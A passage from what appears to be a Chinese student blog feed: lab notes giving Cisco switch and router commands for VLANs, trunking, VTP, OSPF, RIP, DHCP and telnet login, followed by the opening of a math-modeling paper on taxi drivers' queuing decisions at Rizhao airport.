trunk<br>Switch(config-if)#switchport trunk allowed vlan all</p></blockquote><p>192.168.1.1 —– &gt;ping 192.168.2.2 <strong>ping不通  ：同一交换机下，不同vlan，不同网段</strong><img src="https://img-blog.csdn.net/20171019103514241?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvc2l6YWlm/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/Center" alt="img"></p><p>192.168.1.1 —– &gt; ping 192.168.1.4 <strong>ping通： 跨交换机，同一vlan，同一网段</strong></p><p><img src="https://img-blog.csdn.net/20171019103517139?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvc2l6YWlm/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/Center" alt="img"></p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><pre class="line-numbers language-c" data-language="c"><code class="language-c">Switch#show ip routeSwitch#show vlanSwitch#write #保存已写的内容    PC<span class="token operator">></span>ipconfig IPPC<span class="token operator">></span>ping <span class="token number">192.168</span><span class="token number">.2</span><span class="token number">.2</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://zhang2002gz.oss-cn-qingdao.aliyuncs.com/img/image-20220903230622353.png" alt="image-20220903230622353"></p><pre class="line-numbers language-c" data-language="c"><code class="language-c">二层交换机Switch<span class="token operator">></span>enSwitch#conf t#设置vlan    <span class="token function">Switch</span><span class="token punctuation">(</span>config<span class="token punctuation">)</span>#vlan <span class="token number">2</span><span class="token function">Switch</span><span class="token punctuation">(</span>config<span class="token punctuation">)</span>#vlan <span class="token number">3</span><span class="token function">Switch</span><span class="token punctuation">(</span>config<span class="token operator">-</span>vlan<span class="token punctuation">)</span>#exit#同一个vlan交流，配置vlan就用switchport access vlan n就足够了<span class="token function">Switch</span><span class="token punctuation">(</span>config<span class="token punctuation">)</span>#<span class="token keyword">int</span> fa <span class="token number">0</span><span class="token operator">/</span><span class="token number">2</span><span class="token function">Switch</span><span class="token punctuation">(</span>config<span class="token operator">-</span><span class="token keyword">if</span><span class="token punctuation">)</span>#switchport access vlan <span class="token number">2</span><span class="token function">Switch</span><span class="token punctuation">(</span>config<span class="token operator">-</span><span class="token keyword">if</span><span class="token punctuation">)</span>#<span class="token keyword">int</span> fa <span class="token number">0</span><span class="token operator">/</span><span class="token number">3</span><span class="token function">Switch</span><span class="token punctuation">(</span>config<span class="token operator">-</span><span class="token keyword">if</span><span class="token punctuation">)</span>#switchport access vlan <span class="token number">3</span>#想vlan2和vlan3交流就得使用trunk协议，二层交换机上配置如下：<span class="token function">Switch</span><span class="token punctuation">(</span>config<span class="token operator">-</span><span class="token keyword">if</span><span class="token punctuation">)</span>#<span class="token keyword">int</span> fa <span class="token number">0</span><span class="token operator">/</span><span class="token number">1</span><span class="token function">Switch</span><span class="token punctuation">(</span>config<span class="token operator">-</span><span class="token keyword">if</span><span class="token punctuation">)</span>#switchport mode trunk  <span class="token function">Switch</span><span class="token punctuation">(</span>config<span class="token operator">-</span><span class="token keyword">if</span><span class="token punctuation">)</span>#end<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-c" data-language="c"><code class="language-c">三层交换机Switch<span class="token operator">></span>enSwitch#conf t<span class="token function">Switch</span><span class="token punctuation">(</span>config<span class="token punctuation">)</span>#vlan <span class="token number">2</span><span class="token function">Switch</span><span class="token punctuation">(</span>config<span class="token punctuation">)</span>#vlan <span class="token number">3</span><span class="token function">Switch</span><span class="token punctuation">(</span>config<span class="token operator">-</span>vlan<span class="token punctuation">)</span>#exit#三层交换机口配置    <span class="token function">Switch</span><span class="token punctuation">(</span>config<span class="token punctuation">)</span>#<span class="token keyword">int</span> fa <span class="token number">0</span><span class="token operator">/</span><span class="token number">1</span><span class="token function">Switch</span><span class="token punctuation">(</span>config<span class="token operator">-</span><span class="token keyword">if</span><span class="token punctuation">)</span>#switchport trunk encapsulation dot1q<span class="token function">Switch</span><span class="token punctuation">(</span>config<span class="token operator">-</span><span class="token keyword">if</span><span class="token punctuation">)</span>#switchport mode trunk<span class="token function">Switch</span><span class="token punctuation">(</span>config<span class="token operator">-</span><span class="token keyword">if</span><span class="token punctuation">)</span>#switchport trunk allowed vlan <span class="token number">2</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token function">Switch</span><span class="token punctuation">(</span>config<span class="token operator">-</span><span class="token keyword">if</span><span class="token punctuation">)</span>#exit#启动vlan n的使用<span class="token function">Switch</span><span class="token punctuation">(</span>config<span class="token punctuation">)</span>#<span class="token keyword">int</span> vlan <span class="token number">2</span><span class="token function">Switch</span><span class="token punctuation">(</span>config<span class="token operator">-</span><span class="token keyword">if</span><span class="token punctuation">)</span>#ip address <span class="token number">192.168</span><span class="token number">.1</span><span class="token number">.1</span> <span class="token number">255.255</span><span class="token number">.255</span><span class="token number">.0</span><span class="token function">Switch</span><span class="token punctuation">(</span>config<span class="token operator">-</span><span class="token keyword">if</span><span class="token punctuation">)</span>#no shutdown<span class="token function">Switch</span><span class="token punctuation">(</span>config<span class="token operator">-</span><span class="token keyword">if</span><span class="token punctuation">)</span>#exit（vlan <span class="token number">3</span> 同理）#开启三层交换机默认路由<span class="token function">Switch</span><span class="token punctuation">(</span>config<span class="token punctuation">)</span>#ip routing<span class="token function">Switch</span><span class="token punctuation">(</span>config<span class="token punctuation">)</span>#exit<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-c" data-language="c"><code class="language-c">##配置VTP服务器https<span class="token operator">:</span><span class="token comment">//www.cnblogs.com/zoulongbin/p/9047390.html</span>#三层交换机实现服务器Switch<span class="token operator">></span>enableSwitch#vlan database<span class="token function">Switch</span><span class="token punctuation">(</span>vlan<span class="token punctuation">)</span>#vtp domain CCTV<span class="token function">Switch</span><span class="token punctuation">(</span>vlan<span class="token punctuation">)</span>#vtp server    ##创建VLAN<span class="token function">Switch</span><span class="token punctuation">(</span>vlan<span class="token punctuation">)</span>#vlan <span class="token number">10</span> name VLAN10<span class="token function">Switch</span><span class="token punctuation">(</span>vlan<span class="token punctuation">)</span>#vlan <span class="token number">20</span> name VLAN20<span class="token function">Switch</span><span class="token punctuation">(</span>vlan<span class="token punctuation">)</span>#exit    ##配置VLAN IP地址Switch#configure terminal<span class="token function">Switch</span><span class="token punctuation">(</span>config<span class="token punctuation">)</span>#interface vlan <span class="token number">10</span><span class="token function">Switch</span><span class="token punctuation">(</span>config<span class="token operator">-</span><span class="token keyword">if</span><span class="token punctuation">)</span>#ip address <span class="token number">192.168</span><span class="token number">.10</span><span class="token number">.1</span> <span class="token number">255.255</span><span class="token number">.255</span><span class="token number">.0</span><span class="token function">Switch</span><span class="token punctuation">(</span>config<span class="token operator">-</span><span class="token keyword">if</span><span class="token punctuation">)</span>#exit<span class="token function">Switch</span><span class="token punctuation">(</span>config<span class="token punctuation">)</span>#interface vlan <span class="token number">20</span><span class="token function">Switch</span><span class="token punctuation">(</span>config<span class="token operator">-</span><span class="token keyword">if</span><span class="token punctuation">)</span>#ip address <span class="token number">192.168</span><span class="token number">.20</span><span class="token number">.1</span> <span class="token number">255.255</span><span class="token number">.255</span><span class="token number">.0</span><span class="token function">Switch</span><span class="token punctuation">(</span>config<span class="token operator">-</span><span class="token keyword">if</span><span class="token punctuation">)</span>#exit    ##开启三层交换机默认路由<span class="token number">3560</span>SW<span class="token punctuation">(</span>config<span class="token punctuation">)</span>#ip routing    #设置端口汇聚<span class="token punctuation">(</span>trunk<span class="token punctuation">)</span><span class="token function">Switch</span><span class="token punctuation">(</span>config<span class="token punctuation">)</span>#interface range fastEthernet <span class="token number">0</span><span class="token operator">/</span><span class="token number">22</span><span class="token operator">-</span><span class="token number">24</span><span class="token function">Switch</span><span class="token punctuation">(</span>config<span class="token operator">-</span><span class="token keyword">if</span><span class="token operator">-</span>range<span class="token punctuation">)</span>#switchport trunk encapsulation dot1q<span class="token function">Switch</span><span class="token punctuation">(</span>config<span class="token operator">-</span><span class="token keyword">if</span><span class="token operator">-</span>range<span class="token punctuation">)</span>#switchport mode trunk<span class="token function">Switch</span><span class="token punctuation">(</span>config<span class="token operator">-</span><span class="token keyword">if</span><span class="token operator">-</span>range<span class="token punctuation">)</span>#no shutdown<span class="token function">Switch</span><span class="token punctuation">(</span>config<span class="token operator">-</span><span class="token keyword">if</span><span class="token operator">-</span>range<span class="token punctuation">)</span>#exit<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-c" data-language="c"><code class="language-c">#二层交换机作为VTP客户端Switch#vlan database<span class="token function">Switch</span><span class="token punctuation">(</span>vlan<span class="token punctuation">)</span>#vtp domain CCTV<span class="token function">Switch</span><span class="token punctuation">(</span>vlan<span class="token punctuation">)</span>#vtp client<span class="token function">Switch</span><span class="token punctuation">(</span>vlan<span class="token punctuation">)</span>#exit    ##设置端口汇聚<span class="token punctuation">(</span>trunk<span class="token punctuation">)</span>Switch#configure terminal<span class="token function">Switch</span><span class="token punctuation">(</span>config<span class="token punctuation">)</span>#interface fastEthernet <span class="token number">0</span><span class="token operator">/</span><span class="token number">24</span><span class="token function">Switch</span><span class="token punctuation">(</span>config<span class="token operator">-</span><span class="token keyword">if</span><span class="token punctuation">)</span>#switchport mode trunk<span class="token function">Switch</span><span class="token punctuation">(</span>config<span class="token operator">-</span><span class="token keyword">if</span><span class="token punctuation">)</span>#no shutdown<span class="token function">Switch</span><span class="token punctuation">(</span>config<span class="token operator">-</span><span class="token keyword">if</span><span class="token punctuation">)</span>#exit    ##分配VLAN所属端口Switch#configure terminal<span class="token function">Switch</span><span class="token punctuation">(</span>config<span class="token punctuation">)</span>#interface range fastEthernet <span class="token number">0</span><span class="token operator">/</span><span class="token number">1</span><span class="token operator">-</span><span class="token number">5</span><span class="token function">Switch</span><span class="token punctuation">(</span>config<span class="token operator">-</span><span class="token keyword">if</span><span class="token operator">-</span>range<span class="token punctuation">)</span>#switchport access vlan <span class="token number">10</span><span class="token function">Switch</span><span class="token punctuation">(</span>config<span class="token operator">-</span><span class="token keyword">if</span><span class="token operator">-</span>range<span class="token punctuation">)</span>#switchport mode access<span class="token function">Switch</span><span class="token punctuation">(</span>config<span class="token operator">-</span><span class="token keyword">if</span><span class="token operator">-</span>range<span class="token punctuation">)</span>#no shutdown<span class="token function">Switch</span><span class="token punctuation">(</span>config<span class="token operator">-</span><span class="token keyword">if</span><span class="token operator">-</span>range<span class="token punctuation">)</span>#exit<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://zhang2002gz.oss-cn-qingdao.aliyuncs.com/img/image-20220903233009617.png" alt="image-20220903233009617"></p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token expression">PC机与路由器间的配置：</span></span><span class="token function">Router</span><span class="token punctuation">(</span>config<span class="token operator">-</span><span class="token keyword">if</span><span class="token punctuation">)</span>#interface FastEthernet0<span class="token operator">/</span><span class="token number">0</span><span class="token function">Router</span><span class="token punctuation">(</span>config<span class="token operator">-</span><span class="token keyword">if</span><span class="token punctuation">)</span>#ip address <span class="token number">192.168</span><span class="token number">.1</span><span class="token number">.254</span> <span class="token number">255.255</span><span class="token number">.255</span><span class="token number">.0</span><span class="token function">Router</span><span class="token punctuation">(</span>config<span class="token operator">-</span><span class="token keyword">if</span><span class="token punctuation">)</span>#no shutdown<span class="token function">Router</span><span class="token punctuation">(</span>config<span class="token operator">-</span><span class="token keyword">if</span><span class="token punctuation">)</span>#exit  <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-c" data-language="c"><code class="language-c">#路由器与路由器间的配置<span class="token function">Router</span><span class="token punctuation">(</span>config<span class="token operator">-</span><span class="token keyword">if</span><span class="token punctuation">)</span>#interface GigabitEthernet0<span class="token operator">/</span><span class="token number">0</span><span class="token function">Router</span><span class="token punctuation">(</span>config<span class="token operator">-</span><span class="token keyword">if</span><span class="token punctuation">)</span>#ip address <span class="token number">172.16</span><span class="token number">.10</span><span class="token number">.1</span> <span class="token number">255.255</span><span class="token number">.255</span><span class="token number">.0</span><span class="token function">Router</span><span class="token punctuation">(</span>config<span class="token operator">-</span><span class="token keyword">if</span><span class="token punctuation">)</span>#no shutdown                          <span class="token function">Router</span><span class="token punctuation">(</span>config<span class="token operator">-</span><span class="token keyword">if</span><span class="token punctuation">)</span>#exit<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">ospf</span><span class="token expression">配置</span></span><span class="token function">Router</span><span class="token punctuation">(</span>config<span class="token punctuation">)</span>#router ospf <span class="token number">10</span>                        <span class="token function">Router</span><span class="token punctuation">(</span>config<span class="token operator">-</span>router<span class="token punctuation">)</span>#network <span class="token number">172.16</span><span class="token number">.10</span><span class="token number">.0</span> <span class="token number">0.0</span><span class="token number">.0</span><span class="token number">.255</span> area <span class="token number">1</span> <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-c" data-language="c"><code class="language-c">#配置loopback接口（ip自定义）<span class="token function">Router</span><span class="token punctuation">(</span>config<span class="token punctuation">)</span>#interface loopback <span class="token number">0</span><span class="token function">Router</span><span class="token punctuation">(</span>config<span class="token operator">-</span><span class="token keyword">if</span><span class="token punctuation">)</span>#ip address <span class="token number">1.1</span><span class="token number">.1</span><span class="token number">.1</span> <span class="token number">255.255</span><span class="token number">.255</span><span class="token number">.255</span><span class="token function">Router</span><span class="token punctuation">(</span>config<span class="token operator">-</span><span class="token keyword">if</span><span class="token punctuation">)</span>#no shutdown<span class="token function">Router</span><span class="token punctuation">(</span>config<span class="token punctuation">)</span>#interface loopback <span class="token number">1</span><span class="token function">Router</span><span class="token punctuation">(</span>config<span class="token operator">-</span><span class="token keyword">if</span><span class="token punctuation">)</span>#ip address <span class="token number">192.168</span><span class="token number">.1</span><span class="token number">.1</span> <span class="token number">255.255</span><span class="token number">.255</span><span class="token number">.0</span><span class="token function">Router</span><span class="token punctuation">(</span>config<span class="token operator">-</span><span class="token keyword">if</span><span class="token punctuation">)</span>#no shutdown<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://zhang2002gz.oss-cn-qingdao.aliyuncs.com/img/image-20220903233645910.png" alt="image-20220903233645910"></p><pre class="line-numbers language-c" data-language="c"><code class="language-c">#路由器地址配置<span class="token function">Router</span><span class="token punctuation">(</span>config<span class="token punctuation">)</span>#interface g0<span class="token operator">/</span><span class="token number">0</span><span class="token function">Router</span><span class="token punctuation">(</span>config<span class="token operator">-</span><span class="token keyword">if</span><span class="token punctuation">)</span>#ip address <span class="token number">192.168</span><span class="token number">.1</span><span class="token number">.1</span> <span class="token number">255.255</span><span class="token number">.255</span><span class="token number">.0</span><span class="token function">Router</span><span class="token punctuation">(</span>config<span class="token operator">-</span><span class="token keyword">if</span><span class="token punctuation">)</span>#no shutdown<span class="token function">Router</span><span class="token punctuation">(</span>config<span class="token operator">-</span><span class="token keyword">if</span><span class="token punctuation">)</span>#exit<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-c" data-language="c"><code class="language-c">#路由器RIP配置<span class="token function">Router</span><span class="token punctuation">(</span>config<span class="token punctuation">)</span>#hostname R0<span class="token function">R0</span><span class="token punctuation">(</span>config<span class="token punctuation">)</span>#route rip<span class="token function">R0</span><span class="token punctuation">(</span>config<span class="token operator">-</span>router<span class="token punctuation">)</span>#network <span class="token number">192.168</span><span class="token number">.1</span><span class="token number">.0</span><span class="token function">R0</span><span class="token punctuation">(</span>config<span class="token operator">-</span>router<span class="token punctuation">)</span>#network <span class="token number">10.0</span><span class="token number">.0</span><span class="token number">.0</span><span class="token function">R0</span><span class="token punctuation">(</span>config<span class="token operator">-</span>router<span class="token punctuation">)</span>#end<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://zhang2002gz.oss-cn-qingdao.aliyuncs.com/img/image-20220903234041573.png" alt="image-20220903234041573"></p><pre class="line-numbers language-c" data-language="c"><code class="language-c">主机的vlan配置：<span class="token function">Switch</span><span class="token punctuation">(</span>config<span class="token punctuation">)</span>#vlan <span class="token number">10</span>  <span class="token function">Switch</span><span class="token punctuation">(</span>config<span class="token operator">-</span>vlan<span class="token punctuation">)</span>#EXIT<span class="token function">Switch</span><span class="token punctuation">(</span>config<span class="token operator">-</span><span class="token keyword">if</span><span class="token punctuation">)</span>#interface fa0<span class="token operator">/</span><span class="token number">1</span> <span class="token function">Switch</span><span class="token punctuation">(</span>config<span class="token operator">-</span><span class="token keyword">if</span><span class="token punctuation">)</span>#switchport mode access <span class="token function">Switch</span><span class="token punctuation">(</span>config<span class="token operator">-</span><span class="token keyword">if</span><span class="token punctuation">)</span>#switchport access vlan <span class="token number">10</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-c" data-language="c"><code class="language-c">二层交换机间的配置：<span class="token function">Switch</span><span class="token punctuation">(</span>config<span class="token punctuation">)</span>#interface fa0<span class="token operator">/</span><span class="token number">24</span> <span class="token function">Switch</span><span class="token punctuation">(</span>config<span class="token operator">-</span><span class="token keyword">if</span><span class="token punctuation">)</span>#switchport mode access <span class="token function">Switch</span><span class="token punctuation">(</span>config<span class="token operator">-</span><span class="token keyword">if</span><span class="token punctuation">)</span>#switchport mode trunk <span class="token function">Switch</span><span class="token punctuation">(</span>config<span class="token operator">-</span><span class="token keyword">if</span><span class="token punctuation">)</span>#switchport trunk allowed vlan all<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://zhang2002gz.oss-cn-qingdao.aliyuncs.com/img/image-20220904091713476.png" alt="image-20220904091713476"></p><pre class="line-numbers language-c" data-language="c"><code class="language-c">路由器与交换机间的配置：（<span class="token number">1</span>）交换机端口配置<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">f</span><span class="token expression"><span class="token number">0</span><span class="token operator">/</span><span class="token number">1</span>协议配置</span></span><span class="token function">Switch</span><span class="token punctuation">(</span>config<span class="token punctuation">)</span>#interface f0<span class="token operator">/</span><span class="token number">1</span><span class="token function">Switch</span><span class="token punctuation">(</span>config<span class="token operator">-</span><span class="token keyword">if</span><span class="token punctuation">)</span>#switchport trunk encapsulation dot1q<span class="token function">Switch</span><span class="token punctuation">(</span>config<span class="token operator">-</span><span class="token keyword">if</span><span class="token punctuation">)</span>#switchport mode trunk<span class="token function">Switch</span><span class="token punctuation">(</span>config<span class="token operator">-</span><span class="token keyword">if</span><span class="token punctuation">)</span>#exit<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">f</span><span class="token expression"><span class="token number">0</span><span class="token operator">/</span><span class="token number">1</span> IP配置</span></span><span class="token function">Switch</span><span class="token punctuation">(</span>config<span class="token punctuation">)</span>#interface f0<span class="token operator">/</span><span class="token number">1</span><span class="token function">Switch</span><span class="token punctuation">(</span>config<span class="token operator">-</span><span class="token keyword">if</span><span class="token punctuation">)</span>#no switchport（使其成为路由器接口） <span class="token function">Switch</span><span class="token punctuation">(</span>config<span class="token operator">-</span><span class="token keyword">if</span><span class="token punctuation">)</span>#ip address <span class="token number">192.168</span><span class="token number">.30</span><span class="token number">.1</span> <span class="token number">255.255</span><span class="token number">.255</span><span class="token number">.0</span>（<span class="token number">2</span>）路由器配置<span class="token function">Switch</span><span class="token punctuation">(</span>config<span class="token punctuation">)</span>#interface f0<span class="token operator">/</span><span class="token number">0</span><span class="token function">Switch</span><span class="token punctuation">(</span>config<span class="token operator">-</span><span class="token keyword">if</span><span class="token punctuation">)</span>#no shutdown<span class="token function">Switch</span><span class="token punctuation">(</span>config<span class="token operator">-</span><span class="token keyword">if</span><span class="token punctuation">)</span>#ip address <span class="token number">192.168</span><span class="token number">.30</span><span class="token number">.2</span> <span class="token number">255.255</span><span class="token number">.255</span><span class="token number">.0</span><span class="token function">Switch</span><span class="token punctuation">(</span>config<span class="token operator">-</span><span class="token keyword">if</span><span class="token punctuation">)</span>#exit<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token expression">DHCP<span class="token operator">:</span>动态地址获取</span></span><span class="token function">Switch</span><span class="token punctuation">(</span>config<span class="token punctuation">)</span>#ip dhcp pool vlan20<span class="token function">Switch</span><span class="token punctuation">(</span>dhcp<span class="token operator">-</span>config<span class="token punctuation">)</span>#network <span class="token number">192.168</span><span class="token number">.20</span><span class="token number">.254</span> <span class="token number">255.255</span><span class="token number">.255</span><span class="token number">.0</span><span class="token function">Switch</span><span class="token punctuation">(</span>dhcp<span class="token operator">-</span>config<span class="token punctuation">)</span>#<span class="token keyword">default</span><span class="token operator">-</span>router <span class="token number">192.168</span><span class="token number">.20</span><span class="token number">.254</span><span class="token function">Switch</span><span class="token punctuation">(</span>dhcp<span class="token operator">-</span>config<span class="token punctuation">)</span>#dns<span class="token operator">-</span>server <span class="token number">8.8</span><span class="token number">.8</span><span class="token number">.8</span><span class="token function">Switch</span><span class="token punctuation">(</span>dhcp<span class="token operator">-</span>config<span class="token punctuation">)</span>#end<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">telnet</span><span class="token expression"><span class="token operator">:</span>远程登陆</span></span>Switch（config）#enable password <span class="token number">123</span>Switch（config）# line vty <span class="token number">0</span> <span class="token number">2</span>Switch（config<span class="token operator">-</span>line）# password cisco<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://zhang2002gz.oss-cn-qingdao.aliyuncs.com/img/image-20220904144443585.png" alt="image-20220904144443585"></p>]]></content>
      
      
      <categories>
          
          <category> 网络工程相关 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 实训记录 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>数学建模：综合选拔题</title>
      <link href="/2022/08/10/%E6%95%B0%E5%AD%A6%E5%BB%BA%E6%A8%A1%E5%9B%BD%E8%B5%9B%E9%80%89%E6%8B%94/"/>
      <url>/2022/08/10/%E6%95%B0%E5%AD%A6%E5%BB%BA%E6%A8%A1%E5%9B%BD%E8%B5%9B%E9%80%89%E6%8B%94/</url>
      
        <content type="html"><![CDATA[<h2 id="数学建模：综合选拔题"><a href="#数学建模：综合选拔题" class="headerlink" title="数学建模：综合选拔题"></a>数学建模：综合选拔题</h2><h3 id="摘要"><a href="#摘要" class="headerlink" title="摘要"></a>摘要</h3><p>随着我国航空工业技术的发展和人民生活水平的不断提高，我国民用航空业发展迅速，在可预见的未来伴随着国产大飞机的逐步投产交付，全国各地将兴建起一批新机场，同时机场的旅客吞吐量不断攀升，旅客离港时出租车是机场重要的散客渠道之一。</p><p>由于不同时空，机场规模不同，航班载客数量等做多方面存在差距，如何解决离港出租车排队等待离港的判断问题的研究具有深远意义。本文针对日照市机场，从出租车司机收益最大的角度出发，给出该机场出租车司机的选择方案模型，并分析模型的合理性和对相关因素的依赖性。</p><p>司机排队等待的收益是不确定的，司机空载返回的成本是确定的，影响司机决策的主要因素是可能的等待时间成本。在司机预测空载返回后，在所节省的排队时间进行正常接送乘客的扣除空载返回的损失后的收益大于在机场排队载客的收益时，司机会倾向于选择空载返回市区，反之司机会倾向于选择在机场排队载客。</p><p>关键字： 排队论 费用决策 数据处理 客流集散特性</p><p>[TOC]</p><h3 id="一、问题重述："><a href="#一、问题重述：" class="headerlink" title="一、问题重述："></a>一、问题重述：</h3><p>根据统计，多数乘客到达机场后，都会将市区作为目的地。而出租车因其方便快捷而备受出港旅客青睐。在今年数据中在同时拥有城市内轨道交通，出租车，机场大巴等出行方式的特大机场如首都机场，通过出租车进行的人员集散仍然十分可观。在出行选择较为单一的中小型机场中，出租车仍作为主要旅客集散方式。</p><p>同时，对于出租车司机，出港旅客也是一个巨大的客户来源。但是，一般来讲，国内机场离城市中心比较远，想要在机场承接客流量，出租车司机往往会面临在机场等待还是回城市中心的选择:</p><p>在机场载客返回。由于国内机场多数采用进站客流与出站客流分离的规划思想使得出租车司机想要在到达机场后载客，需要按照“先来后到”的顺序进入指定“蓄车池”等待，等待时间则取决于到港乘客多少、蓄车池数量以及排队出租车的数量，这就需要司机付出一定的时间成本。</p><p>空载返回市区接客。出租车司机付出空载费用（多余的油耗、时间等）以及潜在客户收益，选择承接城区稳定的客流量来源。</p><p>在整个问题中最为影响司机决策判断的应为时间成本，即损失时间内可获得的经济效益</p><h3 id="二、模型假设与符号说明："><a href="#二、模型假设与符号说明：" class="headerlink" title="二、模型假设与符号说明："></a>二、模型假设与符号说明：</h3><h4 id="2-1模型假设"><a href="#2-1模型假设" class="headerlink" title="2.1模型假设"></a>2.1模型假设</h4><p>根据题意进行如下假设</p><p>（1）假设乘客在机场乘车需经历排队过程而非完全随机。</p><p>（2）不同时间段到达航班数量不同，视为不同变量。</p><p>（3）忽略国内航班与国际航班及不同客机型号载客量的差异。</p><p>（4）忽略时令导致的航班时刻变化，将全年某一航班到达时间视为相同。</p><p>（5）忽略航班取消，晚点等不可抗力影响。</p><p>（6）假设出租车司机只接待从市中心到机场与从离开机场的乘客。</p><p>（7）决策的选择仅考虑经济因素，忽略个人倾向等其他因素。</p><h4 id="2-2符号说明"><a href="#2-2符号说明" class="headerlink" title="2.2符号说明"></a>2.2符号说明</h4><table><thead><tr><th>符号</th><th>含义</th><th>单位</th></tr></thead><tbody><tr><td>Q</td><td>模型决策变量，根据所得Q值进行决策</td><td></td></tr><tr><td>N（t）</td><td>排队车辆数目</td><td>辆</td></tr><tr><td>L</td><td>机场到市中心距离</td><td>千米</td></tr><tr><td>R</td><td>市区半径</td><td>千米</td></tr><tr><td><img src="D:\gitee-blog\source_posts\数学建模\wps1.jpg"></td><td>司机等待载客预期收益</td><td>元</td></tr><tr><td>T</td><td>等待载客的排队时间</td><td>小时</td></tr><tr><td><img src="D:\gitee-blog\source_posts\数学建模\wps2.jpg"></td><td>出租车司机的平均时薪</td><td>元</td></tr><tr><td>k</td><td>航班的平均载客数</td><td>人</td></tr><tr><td><img src="D:\gitee-blog\source_posts\数学建模\wps3.jpg"></td><td>车辆接受服务的平均时间</td><td>秒</td></tr><tr><td>λ</td><td>单位时刻出租车到达的数量</td><td>辆</td></tr><tr><td>c</td><td>车站的上车点数</td><td>个</td></tr><tr><td><img src="D:\gitee-blog\source_posts\数学建模\wps4.jpg"></td><td>平均服务率</td><td></td></tr></tbody></table><h3 id="三、问题分析："><a href="#三、问题分析：" class="headerlink" title="三、问题分析："></a>三、问题分析：</h3><p>为充分分析决策的影响因素及其机理，我们可以将影响出租车司机决策的因素简单估计成，在机场选择留下等待送客和选择在市区拉客各自参生的的预期利润。   </p><p>综上所述我们可以将司机所作出的决策，所产生结果下分为两个部分</p><table><thead><tr><th></th><th>司机是否进行排队等待</th><th>空载或载客</th></tr></thead><tbody><tr><td>1</td><td>是</td><td>全程载客</td></tr><tr><td>2</td><td>否</td><td>空载返回</td></tr></tbody></table><p>一、排队等候，通过排队车辆数，航班到站时间等情况估算等候的时间成本，并结合载客回市区的收益得出采取此决策的预期利润。</p><p>二、空载返回,将空跑损耗作为成本，估计返回节省下的等候时间在市区拉客产生的收益，同样地可以给出采取空载返回能够顺利载客情况下，决策的预期利润。</p><p>三、假设在空载返回后，能够立刻拉客，在市区等待载客的时间能够忽略不计。</p><p>在司机预测空载返回后，在所节省的排队时间进行正常接送乘客的扣除空载返回的损失后的收益大于在机场排队载客的收益时，司机会倾向于选择空载返回市区，反之司机会倾向于选择在机场排队载客。</p><p>司机排队等待的收益是不确定的，司机空载返回的成本是确定的，影响司机决策的主要因素是可能的等待时间成本。机场的出租车载客收益与载客的行驶里程有关，乘客的目的地有远有近，但总体保持在市区范围内。</p><h3 id="四、样例分析："><a href="#四、样例分析：" class="headerlink" title="四、样例分析："></a>四、样例分析：</h3><p>以日照机场为例，由于学校所在地为日照，通过日照本地宝等平台对日照机场部分信息进行了收集处理。日照机场主要运营国内航向到站时间集中于上午九时至晚九时，出站时间为上午十时至晚二十二时。</p><p>统计结果如下图所示：</p><center><img src="D:\gitee-blog\source\_posts\数学建模\wps5.jpg" style="zoom:80%;" /> </center><center>图3-1 日照国际航空港到站航班频率分布图</center><center><img src="D:\gitee-blog\source\_posts\数学建模\wps6.jpg" style="zoom:80%;" /> </center>图4-2 